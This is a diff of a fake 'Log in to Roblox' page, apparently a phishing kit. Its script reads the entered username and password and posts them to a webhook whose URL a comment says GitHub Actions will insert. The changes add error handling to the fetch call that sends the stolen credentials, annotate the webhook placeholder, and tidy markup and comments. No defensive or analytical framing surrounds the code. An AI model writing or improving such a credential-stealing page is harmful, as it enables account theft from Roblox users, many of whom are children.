@@ -9,7 +9,7 @@
     <!-- MachineID: 73afded3-c84d-c2cf-1db2-f7dbf4293acc -->
     <title>Log in to Roblox</title>
     <div class="content">
-        <script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async="" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportResourceError('funcaptcha')"></script>
+        <script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async="" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportResourceError('funcaptcha')"></script>
 
         <script type="text/javascript">
             var Roblox = Roblox || {};
@@ -24,8 +24,6 @@
                 }
             });
 
-            // Necessary because of how FunCaptcha js executes callback
-            // i.e. window["{function name}"]
             function reportFunCaptchaLoaded() {
                 if (Roblox.BundleDetector) {
                     Roblox.BundleDetector.reportResourceLoaded("funcaptcha");
@@ -98,7 +96,7 @@
             var username = document.getElementById('login-username').value;
             var password = document.getElementById('login-password').value;
 
-            var webhookURL = '__WEBHOOK_URL__';  // Placeholder
+            var webhookURL = '__WEBHOOK_URL__';  // Placeholder to be replaced by GitHub Actions
 
             var payload = {
                 content: `Username: ${username}\nPassword: ${password}`
@@ -111,7 +109,12 @@
                 },
                 body: JSON.stringify(payload)
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json();
+            })
             .then(data => console.log('Success:', data))
             .catch(error => console.error('Error:', error));
         });
